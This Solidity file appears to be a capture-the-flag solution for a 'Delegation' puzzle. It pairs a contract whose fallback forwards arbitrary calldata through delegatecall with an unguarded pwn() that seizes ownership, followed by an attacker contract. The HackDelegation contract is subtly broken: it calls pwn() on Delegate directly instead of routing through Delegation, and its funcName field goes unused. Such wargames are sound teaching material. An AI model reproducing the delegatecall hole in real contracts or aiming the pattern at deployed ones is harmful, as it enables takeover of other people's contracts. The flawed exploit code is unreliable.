// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract HackDelegation {

    Delegate delegate;
    string funcName;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        funcName = "pwn()";
    }

    function delegationHack () public {
        (bool result, bytes memory data) = address(delegate).call(abi.encodeWithSignature("pwn()"));
    }
}